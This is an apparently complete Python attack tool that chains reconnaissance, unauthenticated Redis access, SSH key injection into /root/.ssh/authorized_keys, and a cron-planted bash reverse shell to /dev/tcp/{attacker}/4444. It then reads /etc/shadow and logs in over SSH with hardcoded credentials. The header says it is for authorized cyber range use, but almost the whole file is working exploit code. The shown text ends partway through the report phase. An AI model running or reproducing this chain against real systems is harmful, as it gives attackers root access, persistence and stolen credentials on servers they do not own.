#!/usr/bin/env python3
"""
+======================================================================+
|     Redis Unauthorized Access — Attack Chain Simulation              |
|     Authorized Cyber Range Penetration Test Only                     |
+======================================================================+

Target: Redis 6.x (no authentication, bound to 0.0.0.0, no protected-mode)
Entry:  Direct unauthenticated connection to Redis on port 6379

Attack Chain:
  Phase 1 -> Reconnaissance         (port scan, service fingerprinting)
  Phase 2 -> Unauthenticated Access (PING, INFO, CONFIG, DBSIZE)
  Phase 3 -> SSH Key Injection       (write public key via CONFIG SET)
  Phase 4 -> Cron Reverse Shell      (backup method via crontab write)
  Phase 5 -> Post-Exploitation       (root enumeration, data exfiltration)
  Phase 6 -> Report & ATT&CK Mapping
"""

import subprocess
import sys
import os
import re
import time
import shutil
import signal
import socket
import threading
from datetime import datetime
from pathlib import Path

# -- rich --------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding
except ImportError:
    print("[*] Installing 'rich' library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages",
                        "--quiet", "rich"], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "rich"], check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Cannot install 'rich'. Install manually: pip install rich")
            sys.exit(1)
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding

console = Console()

# -- Global state ------------------------------------------------------------
STATE = {
    "attacker_ip":  None,
    "victim_ip":    None,
    "redis_port":   6379,
    "ssh_port":     22,
    "shell_port":   4444,

    # SSH key paths
    "ssh_key_path":     "/tmp/redis_rsa",
    "ssh_pubkey_path":  "/tmp/redis_rsa.pub",

    # Process handles
    "listener_proc": None,

    # Results
    "loot": {},
    "ssh_root_achieved": False,
    "cron_shell_achieved": False,
    "use_raw_socket": False,

    "start_time": datetime.now(),
}

# -- MITRE ATT&CK -----------------------------------------------------------
MITRE = [
    ("Reconnaissance",        "T1595.002", "Active Scanning -- Vulnerability Scanning"),
    ("Reconnaissance",        "T1592.002", "Gather Victim Host Info -- Software"),
    ("Initial Access",        "T1190",     "Exploit Public-Facing Application (Redis Misconfig)"),
    ("Persistence",           "T1098.004", "Account Manipulation -- SSH Authorized Keys"),
    ("Execution",             "T1053.003", "Scheduled Task/Job -- Cron"),
    ("Execution",             "T1059.004", "Command & Scripting Interpreter -- Unix Shell"),
    ("Credential Access",     "T1552.001", "Unsecured Credentials -- Credentials in Files"),
    ("Collection",            "T1005",     "Data from Local System"),
    ("Initial Access",        "T1078.003", "Valid Accounts -- Local Accounts"),
]

# ---------------------------------------------------------------------------
#  Helpers
# ---------------------------------------------------------------------------

def run(cmd: list, timeout: int = 90, stdin_data: str = None) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timed out"
    except FileNotFoundError as e:
        return -2, "", f"Tool not found: {e}"
    except Exception as e:
        return -3, "", str(e)


def check_port(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# -- Raw socket Redis protocol (RESP) fallback ------------------------------

def redis_cmd_raw(sock, *args):
    """Send a Redis command using RESP protocol over a raw socket."""
    cmd = f"*{len(args)}\r\n"
    for arg in args:
        arg = str(arg)
        cmd += f"${len(arg)}\r\n{arg}\r\n"
    sock.sendall(cmd.encode())
    time.sleep(0.3)
    chunks = []
    sock.setblocking(False)
    try:
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                chunks.append(data.decode(errors="replace"))
            except BlockingIOError:
                break
    except Exception:
        pass
    finally:
        sock.setblocking(True)
    return "".join(chunks)


def redis_connect_raw(ip: str, port: int, timeout: float = 5.0):
    """Open a raw TCP socket to Redis."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((ip, port))
    return sock


def redis_cli(victim: str, port: int, *args, stdin_data: str = None) -> tuple:
    """Execute a redis-cli command. Falls back to raw socket if configured."""
    if STATE["use_raw_socket"]:
        try:
            sock = redis_connect_raw(victim, port)
            result = redis_cmd_raw(sock, *args)
            sock.close()
            return 0, result, ""
        except Exception as e:
            return -1, "", str(e)
    else:
        cmd = ["redis-cli", "-h", victim, "-p", str(port)] + [str(a) for a in args]
        return run(cmd, timeout=15, stdin_data=stdin_data)


# -- Pretty-print -----------------------------------------------------------

def phase_header(n: int, title: str, desc: str = ""):
    console.print()
    console.rule(f"[bold magenta]  PHASE {n} -- {title}  [/bold magenta]", style="magenta")
    if desc:
        console.print(f"  [dim]{desc}[/dim]")
    console.print()


def step(label: str, title: str):
    console.print(f"  [bold cyan]> {label}[/bold cyan]  [white]{title}[/white]")


def ok(msg: str):
    console.print(f"    [bold green]OK[/bold green]  {msg}")


def warn(msg: str):
    console.print(f"    [bold yellow]!![/bold yellow]  {msg}")


def err(msg: str):
    console.print(f"    [bold red]XX[/bold red]  {msg}")


def info(msg: str):
    console.print(f"    [dim]->[/dim]  {msg}")


def cmd_display(cmd_str: str):
    console.print(f"    [dim yellow]$[/dim yellow]  [italic dim]{cmd_str}[/italic dim]")

# ---------------------------------------------------------------------------
#  Phase 0: Banner + Config
# ---------------------------------------------------------------------------

def banner():
    art = r"""
    ____           ___         __  __                __  __
   / __ \___  ____/ (_)____   / / / /___  ____ ___  / /_/ /_
  / /_/ / _ \/ __  / / ___/  / / / / __ \/ __ `/ / / / __/ __ \
 / _, _/  __/ /_/ / (__  )  / /_/ / / / / /_/ / /_/ / /_/ / / /
/_/ |_|\___/\__,_/_/____/   \____/_/ /_/\__,_/\__,_/\__/_/ /_/
                        Misconfiguration Attack
    """
    console.print(Panel(
        f"[bold red]{art}[/bold red]\n"
        "[bold white]Redis Unauthorized Access -- Full Kill Chain Simulation[/bold white]\n\n"
        "[dim]  Target:  Redis 6.x (no auth, bound to 0.0.0.0, no protected-mode)[/dim]\n"
        "[dim]  Vector:  Unauthenticated CONFIG SET to write arbitrary files[/dim]\n"
        "[dim]  Impact:  Root-level code execution via SSH key or cron job[/dim]\n"
        f"[dim]  Started: {STATE['start_time'].strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold red]REDIS UNAUTHORIZED ACCESS EXPLOITATION[/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    console.print()


def configure():
    console.print(Panel(
        "[bold]Enter target and attacker configuration.[/bold]\n\n"
        "The attacker IP must be reachable from the victim (for cron reverse shell).",
        title="[bold blue]Configuration[/bold blue]",
        border_style="blue",
    ))
    console.print()

    STATE["attacker_ip"] = Prompt.ask(
        "  [bold cyan]Attacker IP[/bold cyan] [dim](this machine)[/dim]",
        default="10.0.0.1",
    )
    STATE["victim_ip"] = Prompt.ask(
        "  [bold yellow]Victim IP[/bold yellow] [dim](Redis server)[/dim]",
        default="10.0.0.2",
    )
    STATE["redis_port"] = int(Prompt.ask("  [cyan]Redis port[/cyan]", default="6379"))
    STATE["ssh_port"] = int(Prompt.ask("  [cyan]SSH port[/cyan]", default="22"))
    STATE["shell_port"] = int(Prompt.ask("  [cyan]Reverse shell port (for cron method)[/cyan]", default="4444"))

    console.print()
    t = Table(title="Configuration", box=box.ROUNDED, border_style="blue")
    t.add_column("Parameter", style="cyan")
    t.add_column("Value", style="white")
    t.add_row("Attacker IP", STATE["attacker_ip"])
    t.add_row("Victim IP", STATE["victim_ip"])
    t.add_row("Redis Port", str(STATE["redis_port"]))
    t.add_row("SSH Port", str(STATE["ssh_port"]))
    t.add_row("Reverse Shell Port", str(STATE["shell_port"]))
    console.print(Padding(t, (0, 2)))
    console.print()

    if not Confirm.ask("  [bold yellow]Launch attack simulation?[/bold yellow]", default=True):
        console.print("[red]Aborted.[/red]")
        sys.exit(0)

# ---------------------------------------------------------------------------
#  Phase 1: Reconnaissance
# ---------------------------------------------------------------------------

def phase_recon():
    phase_header(1, "RECONNAISSANCE",
                 "Port scanning, service fingerprinting, tool verification")

    victim = STATE["victim_ip"]
    redis_port = STATE["redis_port"]

    # 1.1 Tool check
    step("1.1", "Checking available tools")
    tools = {
        "nmap":      "Port scanner",
        "redis-cli": "Redis command-line client",
        "ssh-keygen": "SSH key generator",
        "ssh":       "SSH client",
        "nc":        "Netcat (reverse shell listener)",
        "sshpass":   "Non-interactive SSH password auth",
    }
    tt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tt.add_column("Tool", style="cyan", width=14)
    tt.add_column("Status", width=14)
    tt.add_column("Purpose", style="dim")
    redis_cli_available = False
    for name, purpose in tools.items():
        found = shutil.which(name) is not None
        status = "[bold green]OK Found[/bold green]" if found else "[red]XX Missing[/red]"
        tt.add_row(name, status, purpose)
        if name == "redis-cli":
            redis_cli_available = found
    console.print(Padding(tt, (0, 4)))

    if not redis_cli_available:
        warn("redis-cli not found -- will use raw socket RESP protocol as fallback")
        STATE["use_raw_socket"] = True
    else:
        STATE["use_raw_socket"] = False

    console.print()

    # 1.2 Port scan
    step("1.2", f"Port scanning {victim}")
    ports = "22,6379"
    cmd_display(f"nmap -sV -p {ports} --open {victim}")
    if shutil.which("nmap"):
        rc, out, _ = run(["nmap", "-sV", f"-p{ports}", "--open", victim], timeout=120)
        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", out)
        if open_ports:
            pt = Table(title=f"Open Ports -- {victim}", box=box.ROUNDED)
            pt.add_column("Port", style="bold yellow", width=8)
            pt.add_column("Service", style="cyan", width=14)
            pt.add_column("Version / Banner", style="white")
            for p, svc, ver in open_ports:
                pt.add_row(p, svc, ver.strip()[:60])
            console.print(Padding(pt, (0, 4)))
            ok(f"{len(open_ports)} open port(s) found")
            STATE["loot"]["open_ports"] = open_ports
        else:
            warn("No open ports detected -- check connectivity")
    else:
        warn("nmap not found, checking ports directly")
        for p in [22, 6379]:
            if check_port(victim, p):
                ok(f"Port {p} is open")
            else:
                err(f"Port {p} is not reachable")
    console.print()

    # 1.3 Quick Redis connectivity check
    step("1.3", f"Checking Redis connectivity on {victim}:{redis_port}")
    if check_port(victim, redis_port):
        ok(f"Redis port {redis_port} is reachable")
    else:
        err(f"Cannot connect to {victim}:{redis_port}")
        info("Verify the victim is running and Redis is started")

    console.print()

# ---------------------------------------------------------------------------
#  Phase 2: Unauthenticated Access Verification
# ---------------------------------------------------------------------------

def phase_unauth_access():
    phase_header(2, "UNAUTHENTICATED ACCESS VERIFICATION",
                 "Connect to Redis, verify no authentication required, enumerate server")

    victim = STATE["victim_ip"]
    port = STATE["redis_port"]

    # 2.1 PING
    step("2.1", "Sending PING command (expect PONG if no auth)")
    cmd_display(f"redis-cli -h {victim} -p {port} PING")
    rc, out, stderr = redis_cli(victim, port, "PING")
    response = out.strip()
    if "PONG" in response:
        ok(f"Response: [bold green]{response}[/bold green]")
        ok("[bold red]NO AUTHENTICATION REQUIRED -- Redis is wide open![/bold red]")
        STATE["loot"]["unauth_confirmed"] = True
    elif "NOAUTH" in response or "ERR" in response:
        err(f"Response: {response}")
        err("Redis requires authentication -- attack will not work")
        if not Confirm.ask("  Continue anyway?", default=False):
            sys.exit(1)
    else:
        warn(f"Unexpected response: {response} {stderr.strip()}")
    console.print()

    # 2.2 INFO server
    step("2.2", "Running INFO server to gather version and OS details")
    cmd_display(f"redis-cli -h {victim} -p {port} INFO server")
    rc, out, _ = redis_cli(victim, port, "INFO", "server")
    if rc == 0 and out.strip():
        info_data = {}
        for line in out.strip().splitlines():
            if ":" in line and not line.startswith("#"):
                k, v = line.split(":", 1)
                info_data[k.strip()] = v.strip()

        redis_version = info_data.get("redis_version", "unknown")
        os_info = info_data.get("os", "unknown")
        tcp_port = info_data.get("tcp_port", "unknown")
        run_id = info_data.get("run_id", "unknown")
        executable = info_data.get("executable", "unknown")
        config_file = info_data.get("config_file", "unknown")

        ft = Table(title="Redis Server Info", box=box.ROUNDED)
        ft.add_column("Property", style="cyan")
        ft.add_column("Value", style="white")
        ft.add_row("Redis Version", f"[bold yellow]{redis_version}[/bold yellow]")
        ft.add_row("OS", os_info)
        ft.add_row("TCP Port", tcp_port)
        ft.add_row("Run ID", run_id[:20] + "..." if len(run_id) > 20 else run_id)
        ft.add_row("Executable", executable)
        ft.add_row("Config File", config_file)
        console.print(Padding(ft, (0, 4)))

        STATE["loot"]["redis_version"] = redis_version
        STATE["loot"]["redis_os"] = os_info
        ok(f"Redis {redis_version} on {os_info}")
    else:
        warn("Could not retrieve INFO server")
    console.print()

    # 2.3 CONFIG GET dir
    step("2.3", "Testing CONFIG GET dir (verify CONFIG command is allowed)")
    cmd_display(f"redis-cli -h {victim} -p {port} CONFIG GET dir")
    rc, out, _ = redis_cli(victim, port, "CONFIG", "GET", "dir")
    response = out.strip()
    if rc == 0 and response and "ERR" not in response:
        ok(f"CONFIG GET dir response: {response}")
        ok("[bold green]CONFIG command is available -- file write attacks are possible![/bold green]")
        STATE["loot"]["config_allowed"] = True
    else:
        err(f"CONFIG GET failed: {response}")
        warn("CONFIG command may be disabled or renamed -- attack may fail")
        STATE["loot"]["config_allowed"] = False
    console.print()

    # 2.4 DBSIZE
    step("2.4", "Checking database size (DBSIZE)")
    cmd_display(f"redis-cli -h {victim} -p {port} DBSIZE")
    rc, out, _ = redis_cli(victim, port, "DBSIZE")
    if rc == 0:
        ok(f"DBSIZE: {out.strip()}")
    console.print()

    # 2.5 List existing keys
    step("2.5", "Listing existing keys (KEYS *)")
    cmd_display(f"redis-cli -h {victim} -p {port} KEYS '*'")
    rc, out, _ = redis_cli(victim, port, "KEYS", "*")
    if rc == 0:
        keys = [k for k in out.strip().splitlines() if k.strip()]
        if keys:
            ok(f"Found {len(keys)} key(s): {', '.join(keys[:10])}")
        else:
            ok("No keys in database (empty)")
    console.print()

    # Summary panel
    console.print(Panel(
        f"  [bold]Redis Version:[/bold]  [yellow]{STATE['loot'].get('redis_version', 'unknown')}[/yellow]\n"
        f"  [bold]OS:[/bold]             {STATE['loot'].get('redis_os', 'unknown')}\n"
        f"  [bold]Auth Required:[/bold]  [bold red]NO[/bold red]\n"
        f"  [bold]CONFIG Allowed:[/bold] [bold red]YES[/bold red]\n\n"
        f"  [dim]Redis is running without authentication and accepts CONFIG commands.[/dim]\n"
        f"  [dim]This allows writing arbitrary files to the filesystem as the Redis user.[/dim]\n"
        f"  [dim]If Redis runs as root, this grants full system compromise.[/dim]",
        title="[bold green]Unauthenticated Access Confirmed[/bold green]",
        border_style="green",
        padding=(1, 3),
    ))
    console.print()

# ---------------------------------------------------------------------------
#  Phase 3: SSH Key Injection (Method 1)
# ---------------------------------------------------------------------------

def phase_ssh_key_injection():
    phase_header(3, "SSH KEY INJECTION (Method 1)",
                 "Generate SSH keypair, write public key to /root/.ssh/authorized_keys via Redis")

    victim = STATE["victim_ip"]
    port = STATE["redis_port"]
    key_path = STATE["ssh_key_path"]
    pubkey_path = STATE["ssh_pubkey_path"]

    # 3.1 Generate SSH keypair
    step("3.1", "Generating SSH keypair for key injection")
    # Remove old keys if they exist
    for f in [key_path, pubkey_path]:
        if os.path.exists(f):
            os.remove(f)

    cmd_display(f"ssh-keygen -t rsa -f {key_path} -N '' -q")
    rc, out, stderr = run(["ssh-keygen", "-t", "rsa", "-f", key_path, "-N", "", "-q"], timeout=15)
    if rc == 0 and os.path.exists(pubkey_path):
        pubkey = open(pubkey_path).read().strip()
        ok(f"SSH keypair generated: {key_path}")
        info(f"Public key: {pubkey[:60]}...")
    else:
        err(f"ssh-keygen failed: {stderr.strip()}")
        return False
    console.print()

    # 3.2 Construct payload with newline padding
    step("3.2", "Constructing SSH key payload with newline padding")
    info("Redis RDB format adds binary data around stored values")
    info("Newline padding ensures the SSH key sits on its own clean line")
    payload = f"\n\n{pubkey}\n\n"
    ok(f"Payload size: {len(payload)} bytes (key + padding)")
    console.print()

    # 3.3 Flush database and set the key
    step("3.3", "Writing SSH public key into Redis")
    cmd_display(f"redis-cli -h {victim} -p {port} FLUSHALL")
    rc, out, _ = redis_cli(victim, port, "FLUSHALL")
    if rc == 0:
        ok(f"FLUSHALL: {out.strip()}")
    else:
        warn(f"FLUSHALL response: {out.strip()}")

    # SET the key - use stdin for redis-cli, raw socket for fallback
    cmd_display(f"redis-cli -h {victim} -p {port} SET crackit '<padded-pubkey>'")
    if STATE["use_raw_socket"]:
        rc, out, _ = redis_cli(victim, port, "SET", "crackit", payload)
    else:
        # Use -x flag to read value from stdin for redis-cli
        cmd = ["redis-cli", "-h", victim, "-p", str(port), "-x", "SET", "crackit"]
        rc, out, stderr = run(cmd, timeout=15, stdin_data=payload)
    response = out.strip()
    if "OK" in response:
        ok(f"SET crackit: {response}")
    else:
        warn(f"SET response: {response}")
    console.print()

    # 3.4 Redirect save directory
    step("3.4", "Redirecting Redis save path to /root/.ssh/authorized_keys")
    cmd_display(f"redis-cli -h {victim} -p {port} CONFIG SET dir /root/.ssh")
    rc, out, _ = redis_cli(victim, port, "CONFIG", "SET", "dir", "/root/.ssh")
    response = out.strip()
    if "OK" in response:
        ok(f"CONFIG SET dir /root/.ssh: {response}")
    else:
        err(f"CONFIG SET dir failed: {response}")
        warn("The /root/.ssh directory may not exist, or Redis may not run as root")

    cmd_display(f"redis-cli -h {victim} -p {port} CONFIG SET dbfilename authorized_keys")
    rc, out, _ = redis_cli(victim, port, "CONFIG", "SET", "dbfilename", "authorized_keys")
    response = out.strip()
    if "OK" in response:
        ok(f"CONFIG SET dbfilename authorized_keys: {response}")
    else:
        err(f"CONFIG SET dbfilename failed: {response}")
    console.print()

    # 3.5 Save the database (writes the RDB file to /root/.ssh/authorized_keys)
    step("3.5", "Saving database (writes RDB file to /root/.ssh/authorized_keys)")
    cmd_display(f"redis-cli -h {victim} -p {port} SAVE")
    rc, out, _ = redis_cli(victim, port, "SAVE")
    response = out.strip()
    if "OK" in response:
        ok(f"SAVE: {response}")
        ok("[bold green]Attacker SSH public key written to /root/.ssh/authorized_keys![/bold green]")
    else:
        err(f"SAVE failed: {response}")
    console.print()

    # 3.6 Test SSH as root
    step("3.6", "Testing SSH login as root with injected key")
    cmd_display(f"ssh -i {key_path} -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@{victim} id")
    rc, out, stderr = run([
        "ssh", "-i", key_path,
        "-o", "StrictHostKeyChecking=no",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        f"root@{victim}", "id",
    ], timeout=20)

    if rc == 0 and "root" in out:
        ok(f"[bold green]SSH as root SUCCESSFUL![/bold green]")
        ok(f"Output: {out.strip()}")
        STATE["ssh_root_achieved"] = True

        console.print(Panel(
            f"[bold green]Root access achieved via SSH key injection![/bold green]\n\n"
            f"  Method:  Wrote attacker SSH public key to /root/.ssh/authorized_keys\n"
            f"  User:    [bold red]root[/bold red]\n"
            f"  Command: ssh -i {key_path} root@{victim}\n\n"
            f"  {out.strip()}",
            title="[bold red]ROOT ACCESS ACHIEVED (Method 1)[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn(f"SSH as root failed (rc={rc})")
        if stderr.strip():
            info(f"Error: {stderr.strip()[:200]}")
        warn("Method 1 failed -- will attempt cron-based reverse shell in Phase 4")
        STATE["ssh_root_achieved"] = False

    console.print()

    # Reset Redis dir to default for clean state
    redis_cli(victim, port, "CONFIG", "SET", "dir", "/var/lib/redis")
    redis_cli(victim, port, "CONFIG", "SET", "dbfilename", "dump.rdb")

    return STATE["ssh_root_achieved"]

# ---------------------------------------------------------------------------
#  Phase 4: Cron-based Reverse Shell (Method 2)
# ---------------------------------------------------------------------------

def phase_cron_shell():
    phase_header(4, "CRON-BASED REVERSE SHELL (Method 2)",
                 "Write reverse shell cron job to /var/spool/cron/crontabs/root via Redis")

    victim = STATE["victim_ip"]
    port = STATE["redis_port"]
    attacker = STATE["attacker_ip"]
    shell_port = STATE["shell_port"]

    if STATE["ssh_root_achieved"]:
        info("Method 1 (SSH key injection) already succeeded")
        if not Confirm.ask("  Run Method 2 (cron reverse shell) anyway?", default=False):
            info("Skipping Phase 4")
            return
    console.print()

    # 4.1 Construct cron payload
    step("4.1", "Constructing cron reverse shell payload")
    cron_payload = f"\n\n*/1 * * * * bash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1\n\n"
    info(f"Cron job: every minute, bash reverse shell to {attacker}:{shell_port}")
    info(f"Payload: [bold yellow]{cron_payload.strip()}[/bold yellow]")
    console.print()

    # 4.2 Flush and write cron payload
    step("4.2", "Writing cron reverse shell via Redis")
    cmd_display(f"redis-cli -h {victim} -p {port} FLUSHALL")
    redis_cli(victim, port, "FLUSHALL")

    cmd_display(f"redis-cli -h {victim} -p {port} SET cron '<reverse-shell-payload>'")
    if STATE["use_raw_socket"]:
        rc, out, _ = redis_cli(victim, port, "SET", "cron", cron_payload)
    else:
        cmd = ["redis-cli", "-h", victim, "-p", str(port), "-x", "SET", "cron"]
        rc, out, stderr = run(cmd, timeout=15, stdin_data=cron_payload)
    response = out.strip()
    if "OK" in response:
        ok(f"SET cron: {response}")
    else:
        warn(f"SET response: {response}")
    console.print()

    # 4.3 Redirect save path to crontabs
    step("4.3", "Redirecting Redis save path to /var/spool/cron/crontabs/root")
    cmd_display(f"redis-cli -h {victim} -p {port} CONFIG SET dir /var/spool/cron/crontabs")
    rc, out, _ = redis_cli(victim, port, "CONFIG", "SET", "dir", "/var/spool/cron/crontabs")
    response = out.strip()
    if "OK" in response:
        ok(f"CONFIG SET dir: {response}")
    else:
        err(f"CONFIG SET dir failed: {response}")

    cmd_display(f"redis-cli -h {victim} -p {port} CONFIG SET dbfilename root")
    rc, out, _ = redis_cli(victim, port, "CONFIG", "SET", "dbfilename", "root")
    response = out.strip()
    if "OK" in response:
        ok(f"CONFIG SET dbfilename: {response}")
    else:
        err(f"CONFIG SET dbfilename failed: {response}")
    console.print()

    # 4.4 Save
    step("4.4", "Saving database (writes cron job to /var/spool/cron/crontabs/root)")
    cmd_display(f"redis-cli -h {victim} -p {port} SAVE")
    rc, out, _ = redis_cli(victim, port, "SAVE")
    response = out.strip()
    if "OK" in response:
        ok(f"SAVE: {response}")
        ok("[bold green]Cron reverse shell written to /var/spool/cron/crontabs/root![/bold green]")
    else:
        err(f"SAVE failed: {response}")
    console.print()

    # 4.5 Start netcat listener and wait for shell
    step("4.5", f"Starting reverse shell listener on port {shell_port}")

    nc_bin = shutil.which("ncat") or shutil.which("nc")
    if not nc_bin:
        err("Neither ncat nor nc found -- cannot start listener")
        warn("Start a listener manually: nc -lvnp {shell_port}")
        return

    run(["fuser", "-k", f"{shell_port}/tcp"], timeout=5)
    time.sleep(0.5)

    cmd_display(f"{nc_bin} -lvnp {shell_port}")
    listener_proc = subprocess.Popen(
        [nc_bin, "-lvnp", str(shell_port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    STATE["listener_proc"] = listener_proc
    time.sleep(1)
    ok(f"Listener active on 0.0.0.0:{shell_port} (PID {listener_proc.pid})")
    console.print()

    step("4.6", "Waiting for cron job to fire (up to 90 seconds)...")
    info("The cron job runs every minute -- shell should connect within ~60 seconds")

    shell_connected = False
    for i in range(90):
        time.sleep(1)
        if i % 10 == 0:
            console.print(f"    [dim]  Waiting... ({i}s / 90s)[/dim]")
        if listener_proc.poll() is not None:
            break
        rc_check, out_check, _ = run(["ss", "-tnp", f"sport = :{shell_port}"], timeout=5)
        if "ESTAB" in out_check:
            shell_connected = True
            break

    console.print()

    if shell_connected:
        ok("[bold green]REVERSE SHELL RECEIVED![/bold green]")
        STATE["cron_shell_achieved"] = True

        console.print(Panel(
            f"[bold green]Root shell established via cron reverse shell![/bold green]\n\n"
            f"  Method:  Wrote cron job to /var/spool/cron/crontabs/root\n"
            f"  Shell:   {attacker}:{shell_port}\n"
            f"  User:    [bold red]root[/bold red] (Redis runs as root)",
            title="[bold red]ROOT ACCESS ACHIEVED (Method 2)[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Shell connection not detected within timeout")
        info(f"The nc listener on port {shell_port} may still receive a connection")
        info("Check: cron may take up to 60 seconds; verify cron service is running on victim")
        STATE["cron_shell_achieved"] = Confirm.ask("  Did you receive a reverse shell?", default=False)

    console.print()

    # Reset Redis dir to default
    redis_cli(victim, port, "CONFIG", "SET", "dir", "/var/lib/redis")
    redis_cli(victim, port, "CONFIG", "SET", "dbfilename", "dump.rdb")

# ---------------------------------------------------------------------------
#  Phase 5: Post-Exploitation
# ---------------------------------------------------------------------------

def phase_post_exploit():
    phase_header(5, "POST-EXPLOITATION",
                 "Root-level system enumeration, credential harvesting, data exfiltration")

    victim = STATE["victim_ip"]
    key_path = STATE["ssh_key_path"]

    if STATE["ssh_root_achieved"]:
        info("Using SSH key injection for post-exploitation (root access)")
        _post_exploit_via_ssh_key()
    elif STATE["cron_shell_achieved"]:
        info("Using cron reverse shell for post-exploitation")
        _post_exploit_via_reverse_shell()
    else:
        info("No root access achieved -- attempting post-exploitation via known SSH credentials")
        _post_exploit_via_ssh_password()


def _post_exploit_via_ssh_key():
    """Run post-exploitation commands via the injected SSH key as root."""
    victim = STATE["victim_ip"]
    key_path = STATE["ssh_key_path"]

    commands = [
        ("5.1", "User Identity",           "id"),
        ("5.2", "Hostname",                "hostname"),
        ("5.3", "System Information",      "uname -a"),
        ("5.4", "Shadow File (root only)", "cat /etc/shadow"),
        ("5.5", "Target Flag File",        "cat /root/TARGET_INFO.txt 2>/dev/null || echo 'File not found'"),
        ("5.6", "Network Configuration",   "ip addr show"),
        ("5.7", "Running Processes",       "ps aux | head -15"),
        ("5.8", "Redis Configuration",     "cat /etc/redis/redis.conf 2>/dev/null | grep -E '^(bind|protected-mode|requirepass|dir|dbfilename)' || echo 'Config not found'"),
    ]

    for label, title, cmd in commands:
        step(label, title)
        cmd_display(f"ssh -i {key_path} root@{victim} '{cmd}'")
        rc, out, stderr = run([
            "ssh", "-i", key_path,
            "-o", "StrictHostKeyChecking=no",
            "-o", "BatchMode=yes",
            "-o", "ConnectTimeout=10",
            f"root@{victim}", cmd,
        ], timeout=20)
        if rc == 0 and out.strip():
            STATE["loot"][label] = out.strip()
            for line in out.strip().splitlines()[:10]:
                console.print(f"      [dim white]{line}[/dim white]")
        else:
            warn(f"Command failed (rc={rc}): {stderr.strip()[:100]}")
        console.print()

    STATE["loot"]["post_exploit"] = "ssh_key"


def _post_exploit_via_reverse_shell():
    """Run post-exploitation commands via the cron reverse shell."""
    listener = STATE.get("listener_proc")
    if listener is None or listener.poll() is not None:
        warn("Reverse shell process not available -- falling back to SSH password method")
        _post_exploit_via_ssh_password()
        return

    import select

    def shell_exec(cmd: str) -> str:
        try:
            listener.stdin.write(f"{cmd}\n".encode())
            listener.stdin.flush()
            time.sleep(2)
            output = ""
            while select.select([listener.stdout], [], [], 0.5)[0]:
                data = listener.stdout.read1(4096).decode(errors="replace")
                output += data
            return output
        except Exception as e:
            return f"Error: {e}"

    commands = [
        ("5.1", "User Identity",           "id"),
        ("5.2", "Hostname",                "hostname"),
        ("5.3", "System Information",      "uname -a"),
        ("5.4", "Shadow File (root only)", "cat /etc/shadow"),
        ("5.5", "Target Flag File",        "cat /root/TARGET_INFO.txt 2>/dev/null || echo 'File not found'"),
        ("5.6", "Network Configuration",   "ip addr show"),
    ]

    for label, title, cmd in commands:
        step(label, title)
        cmd_display(cmd)
        output = shell_exec(cmd)
        if output.strip():
            STATE["loot"][label] = output.strip()
            for line in output.strip().splitlines()[:10]:
                console.print(f"      [dim white]{line}[/dim white]")
        console.print()

    STATE["loot"]["post_exploit"] = "reverse_shell"


def _post_exploit_via_ssh_password():
    """Fallback: run post-exploitation via SSH with known credentials."""
    victim = STATE["victim_ip"]

    step("5.F", "Fallback: running post-exploitation via SSH (redisuser/redis123)")
    info("Using known credentials: redisuser / redis123")

    if not shutil.which("sshpass"):
        warn("sshpass not installed -- install with: sudo apt install sshpass")
        info("Skipping SSH-based post-exploitation")
        return

    commands = [
        ("System Info",     "id; hostname; uname -a"),
        ("Network",         "ip -br addr show"),
        ("Users",           "cat /etc/passwd | grep -v nologin | grep -v false"),
        ("Redis Process",   "ps aux | grep redis | grep -v grep | head -5"),
        ("Flag File",       "sudo cat /root/TARGET_INFO.txt 2>/dev/null || echo 'No root access via sudo'"),
    ]

    for label, cmd in commands:
        info(f"[bold]{label}[/bold]")
        cmd_display(f"sshpass -p 'redis123' ssh redisuser@{victim} '{cmd}'")
        rc, out, _ = run(
            ["sshpass", "-p", "redis123",
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8",
             f"redisuser@{victim}", cmd],
            timeout=15,
        )
        if rc == 0:
            for line in out.strip().splitlines()[:6]:
                console.print(f"      [dim white]{line}[/dim white]")
        else:
            warn(f"Command failed (rc={rc})")
        console.print()

    STATE["loot"]["post_exploit"] = "ssh_password_fallback"

# ---------------------------------------------------------------------------
#  Phase 6: Report
# ---------------------------------------------------------------------------

def phase_report():
    phase_header(6, "OPERATION REPORT",
                 "Summary, ATT&CK mapping, kill chain, defensive recommendations")

    duration = datetime.now() - STATE["start_time"]
    redis_ver = STATE["loot"].get("redis_version", "unknown")
    unauth = STATE["loot"].get("unauth_confirmed", False)
    method1 = STATE["ssh_root_achieved"]
    method2 = STATE["cron_shell_achieved"]

    # Operation Summary
    console.print(Panel(
        f"[bold]Redis Unauthorized Access Simulation Complete[/bold]\n\n"
